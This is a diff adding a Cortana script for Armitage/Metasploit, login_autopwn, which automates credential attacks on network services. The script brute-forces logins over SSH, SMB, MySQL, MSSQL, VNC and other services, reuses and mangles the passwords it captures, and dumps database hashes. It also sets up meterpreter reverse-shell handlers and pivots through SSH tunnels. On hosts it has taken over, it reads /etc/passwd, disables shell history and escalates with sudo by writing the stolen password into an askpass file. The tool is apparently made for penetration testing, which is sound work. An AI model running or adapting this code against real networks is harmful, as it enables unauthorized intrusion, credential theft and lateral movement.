@@ -1,0 +1,4118 @@
+# login_autopwn.cna
+#
+# Ryan Baxendale - Security-Assessment.com
+# rbaxendale [at] gmail [.] com
+#
+#------------------------------------------------------------------------------  
+#debug(4);
+global('$pass_replay $pass_reuse $pass_mangle $pass_mangle_across_users $pass_wordlist $pass_wordlist_mangle $pass_wordlist_userfile $pass_wordlist_passfile $AutoAttack $upgradeToMeterpreter $winpayload $winport $winpayload_pivot $winport_pivot $linuxpayload $linuxport $linuxpayload_pivot $preferjavapayload $javapayload $javaport $javapayload_pivot $threads $MaxGuessesPerUser $MaxGuessesPerService $AutoRunScript $InitialAutoRunScript @blacklisted_shells $runJTR $JOHN_PATH $JOHN_BASE $JOHN_MUNGE $JOHN_WORDLIST $postExploitation $autopivot $portscan_type $portscan_concurrency $portscan_ports $portscan_timeout $portscan_connect_timeout $ListenerTimeout $WfsDelay $socks_proxy_port $ssh_tunnels_num');
+#
+###############################################################################
+# EDIT THE SETTINGS BELOW HERE
+#
+
+# Try username and password pairs across different services
+$pass_replay = "1";
+# Try passwords across different accounts
+$pass_reuse = "1";
+# Use a wordlist of usernames and passwords
+$pass_wordlist = "1";
+# Apply rules to discovered passwords
+$pass_mangle = "1";
+# Take password for user1, apply mangle rules, and try it for user2
+$pass_mangle_across_users = "0";
+# This will take every username and password in the wordlist and apply rules
+$pass_wordlist_mangle = "0";
+#$pass_wordlist_userfile = "/home/ryan/bin/metasploit/data/wordlists/unix_users.txt";
+#$pass_wordlist_passfile = "/home/ryan/bin/metasploit/data/wordlists/unix_passwords.txt";
+$pass_wordlist_userfile = "/home/ryan/login_autopwn/wordlist_user.txt";
+$pass_wordlist_passfile = "/home/ryan/login_autopwn/wordlist_pass.txt";
+
+# This will allow the user to decide if all discovered services should get attacked
+# or if the user wants to run attack_ssh for only attacking ssh etc
+$AutoAttack = "0";
+
+# Set this to 1 to upgrade all command shells to meterpreter
+# Set this to 0 if you do not want to upload a meterpreter payload and execute it to get a meterpreter session
+$upgradeToMeterpreter = "0";
+
+# Set this to 1 if you want to run all the post exploitation modules
+$postExploitation = "0";
+
+# Pivot when a meterpreter session is opened (1 pivot, 0 no pivot)
+# or use ssh to pivot over a shell session
+$autopivot = "1";
+
+# Set this to the Windows payload for psexec and other windows shells
+$winpayload = "windows/meterpreter/reverse_tcp";
+# Set this to the lport or listening port of metasploit handler
+$winport = "443";
+# Set this to the Windows payload to use when pivoting
+# This has to be a BIND payload, as we cannot do a reverse connection
+$winpayload_pivot = "windows/meterpreter/bind_tcp";
+
+# Set this to the 32bit Linux payload for upgrading command shells
+$linuxpayload = "linux/x86/meterpreter/reverse_nonx_tcp";
+# Set this to the lport or listening port of the metasploit handler
+$linuxport = "445";
+# Set this to the Linux payload to use when pivoting
+# This has to be a BIND payload, as we cannot do a reverse connection
+$linuxpayload_pivot = "linux/x86/meterpreter/bind_tcp";
+
+# Set this to 1 if you want to use the java payload instead of the "not ready for production" linux meterpreter payload
+$preferjavapayload = "0";
+
+# Set this to the Java payload for upgrading command shells
+$javapayload = "java/meterpreter/reverse_tcp";
+# Set this to the lport or listening port of the metasploit handler
+$javaport = "8080";
+# Set this to the Linux payload to use when pivoting
+# This has to be a BIND payload, as we cannot do a reverse connection
+$javapayload_pivot = "java/meterpreter/bind_tcp";
+
+# Set this to the number of threads to configure each metasploit login module.
+$threads = "32";
+
+# Maximum guesses for a particular username for the service instance.
+# Note that users are considered unique among different services, so a user at 10.1.1.1:22 is different from one at 10.2.2.2:22, and both will be tried up to the MaxGuessesPerUser limit. If set to zero or a non-number, this option will not be used.
+$MaxGuessesPerUser = "";
+
+# Maximum number of credentials to try per service instance. If set to zero or a non-number, this option will not be used.
+$MaxGuessesPerService = "";
+
+# A script to run automatically on session creation.
+$AutoRunScript = "";
+
+# An initial script to run on session creation (before AutoRunScript)
+$InitialAutoRunScript = "";
+
+# This is a list of shells that are known to not work if you try to login as that user.
+# This is used to parse through the /etc/passwd file for valid users that can login, so users
+# with shells of /bin/false /usr/sbin/nologin etc, shouldn't be targetted
+@blacklisted_shells = @("/bin/false", "/usr/sbin/nologin", "/bin/nologin", "/sbin/nologin", "/bin/sh", "/bin/sync", "/bin/sync", "/sbin/shutdown", "/sbin/halt");
+
+# Set this to 1 if you want to dump and crack hashes after getting a shell
+$runJTR = "0";
+# You also need to configure the following for John the Ripper to work
+# These default options will work in BackTrack
+# This is the path to the john binary
+$JOHN_PATH = "";
+# This is the directory to where doc run and src are
+$JOHN_BASE = "/home/ryan/bin/metasploit/data/john/";
+# This will apply john rules
+$JOHN_MUNGE = "0";
+# The wordlist for john the ripper to use
+#$JOHN_WORDLIST = "/home/ryan/wordlists/rockyou.txt";
+$JOHN_WORDLIST = "/home/ryan/login_autopwn/wordlist_pass.txt";
+
+# Configure the following for the port scanning module
+# This can be tcp, syn, ack, or the name of a module listed in
+# (default: auxiliary/scanner/portscan/tcp)
+$portscan_type = "auxiliary/scanner/portscan/tcp";
+# The number of concurrent ports to check per host (default: 10)
+$portscan_concurrency = "20";
+# Ports to scan (e.g. 22-25,80,110-900)
+$portscan_ports = "445,22,3306,1433,5432,5900,902,21,161,27017";
+# The socket connect timeout in milliseconds (default: 1000)
+$portscan_timeout = "500";
+# The number of seconds to wait when attempting to connect to the target port
+$portscan_connect_timeout = "1";
+
+# The maximum number of seconds to wait for new sessions
+$ListenerTimeout = "120";
+# Additional delay when waiting for a session
+$WfsDelay = "60";
+
+# The port to start the socks proxy on so that we can ssh pivot over a meterpreter pivot
+$socks_proxy_port = "4545";
+# The number of ssh tunnels to create for each network
+$ssh_tunnels_num = 3;
+
+#
+#
+# End of user config, below is the script
+# DONT EDIT ANYTHING BELOW HERE... ZOMBIES AHEAD!
+#
+###############################################################################
+if( -exists script_resource("the_new_stuff.sl") ){
+	include( script_resource("the_new_stuff.sl") );
+}
+
+global('$usernamefile @blacklist_users $rule_complexity $rule_complexity_max $key_location $key_location_pub @ssh_tunnels @johnworkload @wordlistmanager %module_options %default_ports $myip $mysubnet');
+# This file will be used to store the discovered usernames from owned hosts
+$usernamefile = "discovered_usernames.txt";
+@blacklist_users = @("helpassistant", "guest", "support_388945a0");
+
+$rule_complexity = 22;
+$rule_complexity_max = 22;
+
+# The name and location of the ssh keys used for ssh dynamic socks proxy
+$key_location = script_resource("ssh_socks_pivot_key");
+$key_location_pub = script_resource("ssh_socks_pivot_key.pub");
+@ssh_tunnels = @();
+
+@wordlistmanager = @();
+
+# the generic options for each _login module
+%module_options['AutoRunScript'] = $AutoRunScript;
+%module_options['InitialAutoRunScript'] = $InitialAutoRunScript;
+%module_options['MaxGuessesPerUser'] = $MaxGuessesPerUser;
+%module_options['MaxGuessesPerService'] = $MaxGuessesPerService;
+%module_options['THREADS'] = $threads;
+%module_options['BLANK_PASSWORDS'] = 'false';
+%module_options['USER_AS_PASS'] = 'true';
+%module_options['DB_ALL_CREDS'] = 'false';
+%module_options['DB_ALL_PASS']  = 'false';
+%module_options['DB_ALL_USERS'] = 'false';
+%module_options['BRUTEFORCE_SPEED'] = 5;
+
+# testing
+%module_options['STOP_ON_SUCCESS'] = 'false';
+
+
+# the list of default ports for each service
+%default_ports['smb'] = @("445");
+%default_ports['ssh'] = @("22");
+%default_ports['mysql'] = @("3306");
+%default_ports['mssql'] = @("1433");
+%default_ports['oracle'] = @("1521");
+%default_ports['postgres'] = @("5432");
+%default_ports['telnet'] = @("23");
+%default_ports['vnc'] = @("5900");
+%default_ports['vmauthd'] = @("902");
+%default_ports['ftp'] = @("21");
+%default_ports['exec'] = @("512");
+%default_ports['login'] = @("513");
+%default_ports['shell'] = @("514");
+%default_ports['snmp'] = @("161");
+%default_ports['afp'] = @("548");
+%default_ports['mongodb'] = @("27017");
+%default_ports['pcanywhere'] = @("5631");
+
+
+global('$debug $spm');
+# Debugging variables
+$debug = 0;
+$spm = 0;
+
+# print the awesome SA ascii art and setup some things
+on ready {
+	get_my_ip();
+	
+	println("\U                                             ");
+	println("\c5Ryan Baxendale rbaxendale [at> gmail [.> com");
+	println("\c0    Security-Assessment.com			");
+	println("\cE        (  .     )						");
+	println("\cE        `)          (					");
+	println("\cF     .     '  . '  `.					");
+	println("\cF     (    , )     (,					");
+	println("\c5  .   `.' ) ('.    ',					");
+	println("\c4   ). , ('.   ( ) (						");
+	println("\c4  (_,) .`), ) _ _,						");
+	println("\c0 /  _____/  / _  \\     ____  ____   _____			");
+	println("\c0 \\____  \\==/ /_\\  \\  _/ ___\\/  _ \\ /     \\		");
+	println("\c0 /       \\/   |    \\ \\  \\__(  <_> )  Y Y  \\		");
+	println("\c0/______  /\\___|__  /  \\____ >____/|__|_|  /		");
+	println("\c0       \\/        \\/  \c5.-.\c0   \\/           \\/:wq	");
+	println("\c5                    (x.0)					");
+	println("\c5                  '=.|w|.='					");
+	println("\c5                  _='`\"``=.				");
+	println("\U                                             ");
+	
+	if ($pass_replay eq "1" ) {
+		println("\c9[+] Trying username and password pairs across different services	[Yes]" );
+	}
+	else {
+		println("\c5[-] Trying username and password pairs across different services	[No]" );
+	}
+	if ($pass_reuse eq "1" ) {
+		println("\c9[+] Trying passwords across different accounts			[Yes]" );
+	}
+	else {
+		println("\c5[-] Trying passwords across different accounts			[No]" );
+	}
+	if ($pass_mangle eq "1" ) {
+		println("\c9[+] Applying rules to discovered passwords				[Yes]" );
+	}
+	else {
+		println("\c5[-] Applying rules to discovered passwords				[No]" );
+	}
+	if ($pass_mangle_across_users eq "1" ) {
+		println("\c9[+] Applying rules to discovered passwords across all accounts 	[Yes]" );
+	}
+	else {
+		println("\c5[-] Applying rules to discovered passwords across all accounts 	[No]" );
+	}
+	if ($pass_wordlist eq "1" ) {
+		println("\c9[+] Using a wordlist of usernames and passwords			[Yes]" );
+	}
+	else {
+		println("\c5[-] Using a wordlist of usernames and passwords			[No]" );
+	}
+	if ($pass_wordlist_mangle eq "1" ) {
+		println("\c9[+] Applying rules to a wordlist of usernames and passwords		[Yes]" );
+	}
+	else {
+		println("\c5[-] Applying rules to a wordlist of usernames and passwords		[No]" );
+	}
+	
+	# Check that JTR is configured correctly
+	if ($JOHN_PATH ne "" && !-exists $JOHN_PATH) {
+		println("\c5[-] JTR: Error could not find JOHN_PATH: " . $JOHN_PATH );
+	}
+	if ($JOHN_BASE ne "" && !-exists $JOHN_BASE) {
+		println("\c5[-] JTR: Error could not find JOHN_BASE: " . $JOHN_BASE );
+	}
+	if ($JOHN_WORDLIST ne "" && !-exists $JOHN_WORDLIST) {
+		println("\c5[-] JTR: Error could not find JOHN_WORDLIST: " . $JOHN_WORDLIST );
+	}
+	
+	check_files_exist();
+	setup_handlers();
+
+	if( have_old_wordlists() ){
+		println("\c5* * * * * *");
+		println("\c5* WARNING - Wordlists detected in directory \[" . script_resource("wordlists/") . "\]");
+		println("\c5* Type '\c2clear_bruteforce_files\c5' to clear the list of failed passwords. You should do this for each new network you want to attack.");
+		println("\c5* * * * * *");
+	}
+	
+	println("Type '\c5start\c0' to attack all services discovered or 'help' to see a list of commands");
+}
+
+sub have_old_wordlists {
+	# returns true if there is anything in the wordlists directory
+	if( size(ls(script_resource("wordlists/"))) > 0 ){
+		return true;
+	}
+	return false;
+}
+
+sub check_files_exist {
+	local('$error $console');
+	# make sure the files we want to use exist, if not then create them
+	if (!-exists script_resource($usernamefile) && !-isFile script_resource($usernamefile) && !-canread script_resource($usernamefile) && !-canwrite script_resource($usernamefile) ) { 
+		#println("\c5[-] Could not find/read \$usernamefile [" . $usernamefile . "] - Creating it now...");
+		createNewFile(script_resource($usernamefile));
+		if (checkError($error)) { 
+			println("\c5[-] Could not create \$usernamefile  [" . script_resource($usernamefile) . "]: $error");
+		}
+	}
+	
+	if (-exists $pass_wordlist_userfile && -isFile $pass_wordlist_userfile && -canread $pass_wordlist_userfile && -canwrite $pass_wordlist_userfile ) { 
+		println("\c9[+] Using \$pass_wordlist_userfile [" . $pass_wordlist_userfile . "]");
+	}
+	else {
+		println("\c5[-] Could not find/read/write \$pass_wordlist_userfile [" . $pass_wordlist_userfile . "] - Please check your settings...");
+	}
+	if (-exists $pass_wordlist_passfile && -isFile $pass_wordlist_passfile && -canread $pass_wordlist_passfile && -canwrite $pass_wordlist_passfile ) { 
+		println("\c9[+] Using \$pass_wordlist_passfile [" . $pass_wordlist_passfile . "]");
+	}	
+	else {
+		println("\c5[-] Could not find/read/write \$pass_wordlist_passfile [" . $pass_wordlist_passfile . "] - Please check your settings...");
+	}
+	
+	if (-exists $key_location && -isFile $key_location && -exists $key_location_pub && -isFile $key_location_pub) { 
+		println("\c9[+] Using ssh identity keys at [" . $key_location . "] and [" . $key_location_pub . "]");
+	}
+	else {
+		println("\c5[-] Creating ssh identity keys at [" . $key_location . "] and [" . $key_location_pub . "]");
+		$console = console();
+		cmd($console, "cd " . script_resource("/") );
+		cmd($console, "ssh-keygen -C login_autopwn_ssh_socks_proxy -t rsa -N '' -f \"$key_location\" -q");
+		cmd_stop($console);
+	}
+}
+
+command start {
+	$AutoAttack = 1;
+	println("\Attacking services...");
+	say("\c5login_autopwn:\c9 Attacking services...");
+}
+
+command stop {
+	$AutoAttack = 0;
+	println("Stopped. You will now have to run a command to start an attack");
+	say("\c5login_autopwn:\c9 Stopped...");
+}
+
+sub setup_handlers {
+	# this is for windows psexec
+	launch("exploit", "multi/handler", %(
+		ExitOnSession => 'false',
+		PAYLOAD => $winpayload,
+		LHOST => "0.0.0.0",
+		LPORT => $winport));
+
+	# this is for linux command shells
+	launch("exploit", "multi/handler", %(
+		ExitOnSession => 'false',
+		PAYLOAD => $linuxpayload,
+		LHOST => "0.0.0.0",
+		LPORT => $linuxport));
+
+	# when all else fails try java
+	launch("exploit", "multi/handler", %(
+		ExitOnSession => 'false',
+		PAYLOAD => $javapayload,
+		LHOST => "0.0.0.0",
+		LPORT => $javaport));
+	
+	# socks proxy server for doing ssh pivots over meterpreter pivots
+	launch("auxiliary", "server/socks4a", %(
+ 		SRVHOST => "127.0.0.1",
+		SRVPORT => $socks_proxy_port));
+}
+
+filter module_execute {
+	local('$category $jobname $info $host $port $wordlist %time');
+	$category = $1;
+	$jobname = $2;
+	$info = $3;
+	
+	if($debug != 0) {
+		println("\c9Module ran [\c0" . $1 . "\c9] [\c0" . $2 . "\c9]");
+		println("\c9[\c0" . $3 . "\c9]");
+	}
+	
+	# first check if the module is a _login module with our wordlist
+	if( "wordlists/" isin $info['USERPASS_FILE'] && "_login" isin $jobname){
+		$wordlist = $info['USERPASS_FILE'];
+		add(@wordlistmanager, $wordlist);
+		
+		if($debug != 0){
+			println("\c2DEBUG adding $wordlist to wordlistmanager");
+		}
+	}
+	
+	
+	# wait for 1 second so the jobs can sync
+	# this is a sort of cheap hack to try and
+	# prevent the same module running more than once
+	#sleep(1 * 1000);
+
+	# return all the arguments so nothing else will break
+	return @_;
+}
+
+###############################################################################
+# Timers, things to run every xx minutes etc
+###############################################################################
+#on heartbeat_1m {
+#on heartbeat_30s {
+on heartbeat_10s {
+	# every minute we check if the jobid is running, if not, then we move the wordlist to the failedlist
+	check_jobs_and_create_failed_list();
+
+	if($debug != 0){
+		println("\cA=====[ " . formatDate("HH:mm:ss") . "\cA ]==========[ SPM " . (size(sessions()) - $spm) . "\cA ]===[ JTR " . size(@johnworkload) . "\cA ]=================");
+		$spm = size(sessions());
+	}
+	
+	if( $AutoAttack eq "1" ){
+		attack_ssh();
+		attack_smb();
+		attack_smb_psexec();
+		attack_ftp();
+		attack_vmauthd();
+		attack_telnet();
+		attack_vnc();
+		attack_pcanywhere();
+	
+		attack_mssql();
+		attack_mysql();
+		attack_oracle();
+		attack_postgres();
+		attack_mongodb();
+	
+		attack_rexec();
+		attack_rlogin();
+		attack_rsh();
+	
+		attack_afp();
+		attack_snmp();
+
+		# get hashes from databases
+		attack_mssql_hashdump();
+		attack_mysql_hashdump();
+		attack_oracle_hashdump();
+		attack_postgres_hashdump();
+	}
+	
+	#
+	# NEED TO CHECK IF JOHN IS RUNNING, THEN MAYBE KILL JOHN AND RUN AGAIN WITH NEW LOOT?
+	# MAYBE ONLY RUN JOHN IS LOOT HAS CHANGED? MAYBE NOT JUST ADDED?
+	#
+	#
+	# pair list
+	# [ name of jtr process/hashes/anything ] [number of requests]
+	# [jtr_linux][12]
+	# sort by number of requests
+	# run the one with the highest number of requests
+	#
+	if ( $runJTR eq "1" ) {
+	
+		# if unix then jtr_unshadow
+
+
+		if ( have_loot_for_service("linux.hashes") eq "1" && ready_for_john("linux") ) {
+		
+			#println("\c5running john on linux hashes");
+		
+			# if the loot contains linux hashes then run jtr_linux
+			#launch("auxiliary", "analyze/jtr_linux", %(
+			#	JOHN_BASE => $JOHN_BASE,
+			#	JOHN_PATH => $JOHN_PATH,
+			#	Munge => $JOHN_MUNGE,
+			#	Wordlist => $JOHN_WORDLIST));
+		}
+
+		# if the loot contains aix then run jtr_aix
+		
+
+		if ( have_loot_for_service("mysql.hashes") eq "1" && ready_for_john("mysql") ) {
+			if($debug != 0){
+				println("DEBUG - got mysql hashes, cracking them");
+			}
+			attack_mysql_hashcrack();
+		}
+
+		if ( have_loot_for_service("mssql.hashes") eq "1" && ready_for_john("mssql") ) {
+			if($debug != 0){
+				println("DEBUG - got mssql hashes, cracking them");
+			}
+			attack_mssql_hashcrack();
+		}
+
+		if ( have_loot_for_service("oracle.hashes") eq "1" && ready_for_john("oracle") ) {
+			if($debug != 0){
+				println("DEBUG - got oracle hashes, cracking them");
+			}
+			attack_oracle_hashcrack();
+		}
+
+		if ( have_loot_for_service("postgres.hashes") eq "1" && ready_for_john("postgres") ) {
+			if($debug != 0){
+				println("DEBUG - got postgres hashes, cracking them");
+			}
+			attack_postgres_hashcrack();
+		}
+	}
+}
+###############################################################################
+# Reads through the current jobs and updates the failed wordlists
+###############################################################################
+command check_jobs_and_create_failed_list {
+	check_jobs_and_create_failed_list();
+}
+
+sub check_jobs_and_create_failed_list {
+	local('$joblist $jobid $host $port $wordlist $item @jobwordlists $x $read $failed_host_service_file $failed_handle $wordlist_handle $error @temp');
+	
+	# add all $item to @jobwordlists
+	# get list of jobs and put into $host|$port|wordlist -> $item
+	$joblist = call('job.list');
+#
+# DO I NEED TO CALL SYNC HERE OR SOMETHING TO MAKE SURE THAT THE JOBS ARE IN SYNC?
+# GET LOTS OF ERRORS ABOUT JOBS NOT EXISTING OR NOT HAVING 'name'
+#
+
+	if( size($joblist) > 0 ){
+		foreach $jobid (keys($joblist)) {
+			if ( job_info($jobid) !is $null ) {
+				if( "wordlists/" isin job_info($jobid)['datastore']['USERPASS_FILE'] && "_login" isin job_info($jobid)['name']){
+					$wordlist = job_info($jobid)['datastore']['USERPASS_FILE'];
+					add(@jobwordlists, $wordlist);
+				}
+			}
+		}
+	}
+	@temp = @wordlistmanager;
+	# remove all @jobwordlists from @temp
+	removeAll(@temp, @jobwordlists);
+	# @temp will be blank if there are no finished jobs
+	
+	if($debug != 0) {
+		if( size(@temp) > 0 ){
+			println("\cAHere are the jobs that have finished: ");
+			for ($x = 0; $x < size(@temp); $x++) {
+				println("\cA" . @temp[$x] );
+			}
+		}
+	}
+	
+	# then whatever is left over are the jobs that have completed and need to update wordlists to failed lists
+	for ($x = 0; $x < size(@temp); $x++) {
+		$host = substr(@temp[$x], lindexOf(@temp[$x], "wordlist_") + 9, lindexOf(@temp[$x], "_"));
+		$port = substr(@temp[$x], lindexOf(@temp[$x], "_") + 1 );
+		$failed_host_service_file = "wordlists/failed" . "_" . $host . "_" . $port;
+		
+		#println("DEBUG failed_host_service_file is " . script_resource($failed_host_service_file) );
+		
+		# open the failed file
+		$failed_handle = openf(">>" . script_resource($failed_host_service_file));
+		if (checkError($error)) {
+			println("\c4Could not write/open file: $error");
+		}
+		
+		#println("DEBUG wordlist_handle is " . @temp[$x] );
+		
+		
+		#open the file @wordlistmanager[$x];
+		$wordlist_handle = openf(@temp[$x]);
+		if (checkError($error)) {
+			println("\c4Could not write/open file: $error");
+		}
+		
+		while $read (readln($wordlist_handle)) {
+			# write this line to the failed file
+			println( $failed_handle, $read );
+			
+			#println("\c9DEBUG wordlist_handle line (" . $port . ") = $read");
+			
+		}
+		closef($wordlist_handle);
+		closef($failed_handle);
+		
+		#now empty out the wordlist
+		$wordlist_handle = openf(">" . @temp[$x]);
+		if (checkError($error)) {
+			println("\c4Could not write/open file: $error");
+		}
+		# now output a blank line to the file
+		writeb($wordlist_handle, "");
+		closef($wordlist_handle);
+	}
+	
+	
+	removeAll(@wordlistmanager, @temp);
+	if($debug != 0) {
+		println("\c9DEBUG new wordlistmanager = " . @wordlistmanager );
+	}
+}
+###############################################################################
+# Loot
+###############################################################################
+command have_loot_for_service {
+	println("result: " . have_loot_for_service($1) );
+}
+sub have_loot_for_service {
+	local('$service @loot $x $ltype');
+	$service = $1;
+	@loot = loots();
+	for( $x = 0; $x < size(@loot); $x++){
+		$ltype = @loot[$x]['ltype'];
+		if( $service isin $ltype ){
+			return "1";
+		}
+	}
+	return "0";
+	clear(@loot);
+}
+
+command have_loot_for_hostservice {
+	println("result: " . have_loot_for_hostservice($1, $2) );
+}
+
+sub have_loot_for_hostservice {
+	local('$host $service @loot $x $ltype');
+	$host = $1;
+	$service = $2;
+	@loot = loot_list($host);
+	for( $x = 0; $x < size(@loot); $x++){
+		$ltype = @loot[$x]['ltype'];
+		if( $service isin $ltype ){
+			return "1";
+		}
+	}
+	return "0";
+	clear(@loot);
+}
+
+command hashdump {
+	hashdump($1, $2, $3);
+}
+
+sub hashdump {
+	local('$search_service $loot_name $module_name @uniqcreds $x $host @rhosts @ignore $y %options @targethost $ssh_tunnel_port');
+	$search_service = $1;
+	$loot_name = $2;
+	$module_name = $3;
+	
+	@uniqcreds = get_uniq_creds_for_service($search_service);
+	
+	if ( size(@uniqcreds) > 0 ) {
+	
+		#println("\c3DEBUG uniqcreds = " . @uniqcreds );
+	
+		for ($x = 0; $x < size(@uniqcreds) ; $x++) {
+			@rhosts = split(", ", @uniqcreds[$x]['hosts']);
+			foreach $host (@rhosts) {
+				#if we already have the loot, then ignore the host
+				if( have_loot_for_hostservice($host, $loot_name) eq "1" ){
+					add( @ignore, $host);
+				}
+			}
+			removeAll(@rhosts, @ignore);
+			# if we are missing loot for hosts, then get it now
+			if( size(@rhosts) > 0 ){
+				# loop through each host
+				for($y = 0; $y < size(@rhosts) ; $y++) {
+				
+					#println("\c3DEBUG host is " . @rhosts[$y] );
+				
+					# only continue if the target is in our network or we have a route/pivot to it
+					if( is_in_my_network(@rhosts[$y]) || have_route(@rhosts[$y], "255.255.255.255") ){
+						if( is_over_ssh_tunnel(@rhosts[$y]) ) {
+							$ssh_tunnel_port = get_ssh_tunnel_for_ip(@rhosts[$y]);
+							wait_for_tunnel($ssh_tunnel_port);
+							%options['Proxies'] = "socks4:127.0.0.1:" . $ssh_tunnel_port;
+						}
+						%options['RPORT'] = @uniqcreds[$x]['port'];
+						%options['USERNAME'] = @uniqcreds[$x]['user'];
+						%options['PASSWORD'] = @uniqcreds[$x]['pass'];
+						
+						# we have to pass the RHOST value as an array
+						add(@targethost, @rhosts[$y]);
+						auxiliary($module_name, @targethost, %options);
+						clear(@targethost);
+					}
+				}
+			}
+		}
+	}
+
+}
+###############################################################################
+# john - John The Ripper
+###############################################################################
+# returns true if there is no matching job containing the $1 in the job's name
+# returns false, when its already cracking those hashes, and sets the appropriate variable
+# the variable is used for the timer to run john every 10m
+command ready_for_john {
+	if( ready_for_john($1) ){
+		println("true");
+	}
+	else {
+		println("false");
+	}
+}
+
+sub ready_for_john {
+	local('$search $isready $joblist $jobid $jobname');
+	#$1 is the search string
+	$search = $1;
+	$isready = true;
+	
+	# if we are currently running a brute force on this port/service, then dont run another
+	$joblist = call('job.list');
+	if( size($joblist) > 0 ){
+		# make sure the jtr job is not already running
+		foreach $jobid (keys($joblist)) {
+			if ( job_info($jobid) !is $null ) {
+				$jobname = job_info($jobid)['name'];
+				$jobname = substr($jobname, lindexOf($jobname, "/") + 1);
+				
+				# need to make sure it can check for postgres_md5_crack
+				# and not get $isready=false when mysql_login or postgres_login is running etc
+				
+				# if the job has search term in its name, then 
+				if ($search isin $jobname && "jtr" isin $jobname) {
+					$isready = false;
+					# update @johnworkload with the $search (name of hashes to crack) and increment the requests to crack
+				}
+			}
+		}
+	}
+	
+	return $isready;
+}
+
+# Every 10 minutes lets run john the ripper (jtr) to crack hashes
+# This will attempt to make sure that we only run one instance of jtr instead of spawning multiple instances
+on heartbeat_10m {
+	if ( $runJTR eq "1" ) {
+		# now iterate through the john workload array and run the jobs that need running
+		# @johnworkload
+	}
+}
+
+###############################################################################
+# Session upgrade and hashdump etc
+###############################################################################
+on session_open {
+# $1 is the session id
+# $2 is the long description of the session
+# $2 example: %(session_host => '192.168.1.58', host => '192.168.1.58', desc => 'Command shell', workspace => 'default', via_payload => 'payload/windows/shell_reverse_tcp', type => 'shell', info => '', tunnel_local => '192.168.1.76:4444', username => 'root', tunnel_peer => '192.168.1.58:56583', routes => '', uuid => 'ft4qeef6', via_exploit => 'exploit/multi/handler', session_port => 56583, target_host => '', exploit_uuid => 'ibtw7hfv')
+#
+# $2 example: %(session_host => '192.168.1.59', host => '192.168.1.59', desc => 'Command shell', workspace => 'default', via_payload => '', type => 'shell', info => 'SSH user:password (192.168.1.59:22)', tunnel_local => '192.168.1.76:40622', tunnel_peer => '192.168.1.59:22', username => 'root', routes => '', via_exploit => 'auxiliary/scanner/ssh/ssh_login', uuid => 'xif2udha', session_port => 22, target_host => '192.168.1.59', exploit_uuid => 'irnudbpl')
+#
+# $2 example: %(session_host => '192.168.1.59', platform => 'x86/linux', host => '192.168.1.59', desc => 'Meterpreter', workspace => 'default', via_payload => 'payload/linux/x86/meterpreter/reverse_tcp', type => 'meterpreter', info => '', tunnel_local => '192.168.1.76:53', tunnel_peer => '192.168.1.59:34794', username => 'root', routes => '', uuid => 'jf6zsz6j', via_exploit => 'exploit/multi/handler', session_port => 34794, target_host => '', exploit_uuid => 'wfxrxojx')
+#
+	local('$session $upgrade_console $sessioninfo $viapayload $passfromsession $randname $sudofile');
+	$session = $1;
+	$sessioninfo = $2['info'];
+	$viapayload = $2['via_payload'];
+
+	println("\c0Session \c4" . $session . "\c0 opened on \c4" . $2['host'] . " " . $sessioninfo);
+
+	# only continue if its a shell session
+	if (-isshell $session) {
+		if ( "windows" isin $viapayload ) {
+		
+			#println("\c4DEBUG: Need to test this part!");
+#
+#
+# need to test this, windows shell upgrade to meterpreter
+#
+#
+			if( $upgradeToMeterpreter eq "1" ){
+				println("upgrading shell session $2['host'] to meterpreter");	
+				$upgrade_console = open_console_tab("upgrade shell");
+				# setg LPORT this is the handler port for the upgrade
+				cmd($upgrade_console, "set LPORT $winportupgrade");
+				cmd($upgrade_console, "show options");
+				cmd($upgrade_console, "sleep 10");
+				# sessions -u $1
+				cmd($upgrade_console, "sessions -u $session");
+			}
+		}	
+		# lets just assume that if its not windows then its unix/linux/mac/aix etc
+		else {
+			# first lets get a list of working user accounts by reading /etc/passwd
+			# and looking for valid shells, or removing invalid shells like /bin/false etc
+			# then add all the users to creds db with blank passwords
+			s_cmd($session, "cat /etc/passwd");
+			# execution will continue at on shell_cat
+			
+			if( $autopivot eq "1" ){
+				autopivot_ssh($session);
+			}
+			
+			if( $postExploitation eq "1" ){
+				# try to get root then upgrade
+				# this is post/multi/manage/sudo.rb
+				# I have tried to write the same module that uses the correct password...
+
+				# get the password from the session info
+				$passfromsession = get_pass_from_session($2);
+
+				# check if we have a password, if yes then lets try to sudo and get root
+				if ( $passfromsession ne "login_autopwn.something.went.wrong" ) {
+					# make a random filename in /tmp/sudoaskpass-RANDOM NUMBERS
+					$randname = "login_autopwn_sudoaskpass-" . rand(10) . rand(10) . rand(10) . rand(10) . rand(10) . "";
+					$sudofile = "/tmp/$randname";
+					# first lets turn off bash history because we dont want to leave passwords in the bash history
+					# delete the previously created sudofile just in case it was left behind from last time
+					# then create the sudofile for the SUDO_ASKPASS environment variable, for non interactive sudo
+					s_cmd($session, "unset HISTFILE ; rm -f /tmp/login_autopwn_sudoaskpass-* ; echo \\#\\!/bin/sh > $sudofile ; echo echo $passfromsession >> $sudofile ; chmod +x $sudofile ; setenv SUDO_ASKPASS $sudofile ; export SUDO_ASKPASS=$sudofile ; sudo -A -i");
+					
+					
+					
+					
+					# ACTUALLY THIS IS A HORRIBLE IDEA... SHELLS GET STUCK WAITING FOR THE USER TO ENTER
+					# A PASSWORD.... MAYBE THE NEXT COMMAND WE RUN CAN BE THE PASSWORD? -- "WILL IT BLEND?"
+					# another way to get non interactive sudo is to pipe it, but lets be sure to remove bash history since we might send the password to the bash history
+					#s_cmd($session, "unset HISTFILE ; echo \'$passfromsession\' | sudo -S id");
+					# execution will continue at 'on shell_unset { ...' this is to make sure sudo has been executed before dumping hashes
+				}
+				else {
+					#println("DEBUG: couldnt get password for session $session . Cant upgrade this shell to root using sudo :(");
+				}
+			}
+			
+			if( $upgradeToMeterpreter eq "1" ){
+				if( $preferjavapayload eq "1" ){
+					s_cmd($session, "whereis java");
+					# execution will continue at on shell_whereis
+				}
+				else {
+					s_cmd($session, "uname -m");
+					# execution will continue at on shell_uname
+				}
+			}
+			
+			
+			if( $postExploitation eq "1" ){
+				#println("DEBUG: now running post modules on linux shell");
+				
+				# this will run hashdump, but this might be the second time it runs due to
+				# the attempts above to get root then run hashdump
+				# more hashes are better than none, right?
+				post("linux/gather/hashdump", $session );
+			
+				#....................................................................
+				# report_auth_info
+				# These store output into creds, this is the most awesome
+				#post("multi/gather/ssh_creds", $session );
+				#post("multi/gather/pgpass_creds", $session );
+				#post("multi/gather/filezilla_client_cred", $session );
+				#post("linux/gather/mount_cifs_creds", $session );
